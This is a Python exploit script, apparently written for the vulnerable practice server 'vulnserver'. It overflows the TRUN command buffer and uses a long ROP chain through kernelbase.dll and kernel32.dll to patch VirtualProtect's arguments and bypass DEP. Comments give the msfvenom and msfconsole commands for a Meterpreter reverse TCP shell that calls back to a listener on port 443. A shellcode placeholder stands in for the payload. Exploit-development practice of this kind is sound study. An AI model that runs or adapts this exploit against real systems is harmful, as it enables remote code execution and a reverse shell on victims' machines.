import socket
import sys
from struct import pack



def main():

    if len(sys.argv) != 2:
        print("Usage: %s <ip_address>\n" % (sys.argv[0]))
        sys.exit(1)
        
    server = sys.argv[1]
    port = 9999



    # Module Base Adddress
    BaseEssfunc = 0x62500000 # essfunc.dll
    BaseAddrKernel32 = 0x76620000 # kernel32.dll
    BaseAddrKernelBase = 0x754c0000 # KERNELBASE.dll

    #  msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.132.12 LPORT=443 -b "\x00" -f py -v shellcode --smallest
    # msfconsole -q -x "use multi/handler;  set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 192.168.132.12; set LPORT 443; exploit"
    shellcode =  b"\x90\x90\x81\xC4\x3C\xF6\xFF\xFF" # add esp,-2500 // give some space to avoid metastploit shellcode decoder to corrupt itelf.
    shellcode += b"YOUR SHELLCODE HERE"


    shellcode += b"B" * (400 - len(shellcode))

    # Payload triggers buffer overlow
    buf = b"TRUN ..\r\n" 
    padding = b"\x90" * 200

    va = pack("<L", (0x45454545)) # dummy VirtualProtect Address
    va += pack("<L", (0x46464646)) # Shellcode Return Address
    va += pack("<L", (0x47474747)) # lpAddress -> Shellcode Return Address
    va += pack("<L", (0x48484848)) # dummy dwSize -> 0x810 or 0xfffff7ef (-0x810)
    va += pack("<L", (0x49494949)) # dummy flNewProtect -> must be 0x40 (PAGE_EXECUTE_READWRITE)
    va += pack("<L", (BaseEssfunc+0x4024)) # dummy lpflOldProtect -> must be writable address to write previous access protection value of the first page

    buf += padding + shellcode + b"\x90" * (2003 - len(shellcode) - len(padding) - len(va)) + va

    # Control EIP
    buf += pack("<L",(BaseAddrKernelBase+0xfcba2)) # (EIP overwrite) 0x100fcba2: pop esi ; ret ; (1 found)
   
   
    # ROP CHAIN
    # Patching VirtualProtect
    rop = pack("<L",(0xf406154)) # VirtualProtect for and operation
    rop += pack("<L",(BaseAddrKernelBase+0xfa8be)) # 0x100fa8be: pop ecx ; ret ; 
    rop += pack("<L",(0x10406154)) # VirtualProtect for and operation
    rop += pack("<L",(BaseAddrKernelBase+0xf864c)) # 0x100f864c: and ecx, esi ; pop esi ; mov eax, ecx ; pop ebx ; retn 0x0004 
    rop += pack("<L",(0x42424242)) # Junk for esi
    rop += pack("<L",(0x42424242)) # retn for ebx
    rop += pack("<L",(BaseAddrKernelBase+0x187f21)) # #0x10187f21: mov ecx,  [ecx] ; mov eax, ecx ; ret ; (1 found) # KernelBase
    rop += pack("<L",(0x42424242)) # junk for retn 0x0004
    rop += pack("<L",(BaseAddrKernelBase+0x1c14e6)) # 0x101c14e6: push esp ; pop esi ; ret ; (1 found
    rop += pack("<L",(BaseAddrKernelBase+0x1447e2)) # pop eax ; ret
    rop += pack("<L",(0xffffffc0)) # -0x40
    rop += pack("<L",(BaseAddrKernelBase+0xfdabd)) # 0x100fdabd: add eax, esi ; pop esi ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for esi
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(BaseAddrKernel32+0x18575)) # 0x68918575: mov  [eax], ecx ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008


    # Patching Shellcode Address 
    rop += pack("<L",(BaseAddrKernelBase+0x1c14e6)) # 0x101c14e6: push esp ; pop esi ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(BaseAddrKernelBase+0x1447e2)) # pop eax ; ret
    rop += pack("<L",(0xfffff880)) # -0x780  ## Shellcode
    rop += pack("<L",(BaseAddrKernelBase+0xfdabd)) # 0x100fdabd: add eax, esi ; pop esi ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for esi
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(BaseAddrKernelBase+0xf868d)) # 0x100f868d: mov ecx, eax ; mov eax, ecx ; pop ebp ; ret # save in ecx
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(0x42424242)) # retn 0x0008
    rop += pack("<L",(0x42424242)) # retn 0x0008
    rop += pack("<L",(BaseAddrKernelBase+0x1c14e6)) # 0x101c14e6: push esp ; pop esi ; ret ; (1 found) 
    rop += pack("<L",(BaseAddrKernelBase+0x1447e2)) # pop eax ; ret
    rop += pack("<L",(0xffffff6c)) # -0x94  # VA to patch for shellcode
    rop += pack("<L",(BaseAddrKernelBase+0xfdabd)) # 0x100fdabd: add eax, esi ; pop esi ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for esi
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(BaseAddrKernel32+0x18575)) # 0x68918575: mov  [eax], ecx ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008

    # Patching lpAddress -> Shellcode Return Address
    rop += pack("<L",(BaseAddrKernelBase+0x11840)) #  0x10011840: inc eax ; ret ; (1 found)
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(BaseAddrKernelBase+0x11840)) #  0x10011840: inc eax ; ret ; (1 found)
    rop += pack("<L",(BaseAddrKernelBase+0x11840)) #  0x10011840: inc eax ; ret ; (1 found)
    rop += pack("<L",(BaseAddrKernelBase+0x11840)) #  0x10011840: inc eax ; ret ; (1 found)
    rop += pack("<L",(BaseAddrKernel32+0x18575)) # 0x68918575: mov  [eax], ecx ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for ebp


    # dummy dwSize -> 0x810 or 0xfffff7ef (-0x810)
    rop += pack("<L",(BaseAddrKernelBase+0x1447e2)) # pop eax ; ret
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0xfffff7ef)) # -0x810
    rop += pack("<L",(BaseAddrKernelBase+0x14c8c2)) # 0x1014c8c2: neg eax ; dec eax ; pop ebp ; ret
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(BaseAddrKernelBase+0xf868d)) # 0x100f868d: mov ecx, eax ; mov eax, ecx ; pop ebp ; ret # save in ecx
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(BaseAddrKernelBase+0x1c14e6)) # 0x101c14e6: push esp ; pop esi ; ret ; (1 found) 
    rop += pack("<L",(BaseAddrKernelBase+0x1447e2)) # pop eax ; ret
    rop += pack("<L",(0xffffff0c)) # -0xf4  # for dwSize
    rop += pack("<L",(BaseAddrKernelBase+0xfdabd)) # 0x100fdabd: add eax, esi ; pop esi ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for esi
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(BaseAddrKernel32+0x18575)) # 0x68918575: mov  [eax], ecx ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for ebp
    

    # dummy flNewProtect -> must be 0x40 (PAGE_EXECUTE_READWRITE)
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(BaseAddrKernelBase+0x1447e2)) # pop eax ; ret
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0xffffffbf)) # -0x41
    rop += pack("<L",(BaseAddrKernelBase+0x14c8c2)) # 0x1014c8c2: neg eax ; dec eax ; pop ebp ; ret
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(BaseAddrKernelBase+0xf868d)) # 0x100f868d: mov ecx, eax ; mov eax, ecx ; pop ebp ; ret # save in ecx
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(BaseAddrKernelBase+0x1c14e6)) # 0x101c14e6: push esp ; pop esi ; ret ; (1 found) 
    rop += pack("<L",(BaseAddrKernelBase+0x1447e2)) # pop eax ; ret
    rop += pack("<L",(0xfffffec8)) # -0x138 # for flNewProtect
    rop += pack("<L",(BaseAddrKernelBase+0xfdabd)) # 0x100fdabd: add eax, esi ; pop esi ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for esi
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(BaseAddrKernel32+0x18575)) # 0x68918575: mov  [eax], ecx ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for ebp

    
    # Align the stack
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(BaseAddrKernelBase+0x1c14e6)) # 0x101c14e6: push esp ; pop esi ; ret ; (1 found) 
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(BaseAddrKernelBase+0x1447e2)) # pop eax ; ret
    rop += pack("<L",(0xfffffe88)) # -0x178 // -17c
    rop += pack("<L",(BaseAddrKernelBase+0xfdabd)) # 0x100fdabd: add eax, esi ; pop esi ; pop ebp ; retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for esi
    rop += pack("<L",(0x42424242)) # junk for ebp
    rop += pack("<L",(BaseAddrKernelBase+0x16b398)) #  0x1016b398: xchg eax, esp ; ret
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
    rop += pack("<L",(0x42424242)) # junk for retn 0x0008
   
    


    buf += rop + b"C" * (0x1000 - len(buf) - len(rop))

    # Send packet to overflow the buffer and overwrite EIP.
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((server,port))
    s.send(buf)
    resp = s.recv(1024)
    print("Response: ",resp)
    s.close()


if __name__ == '__main__':
    main()
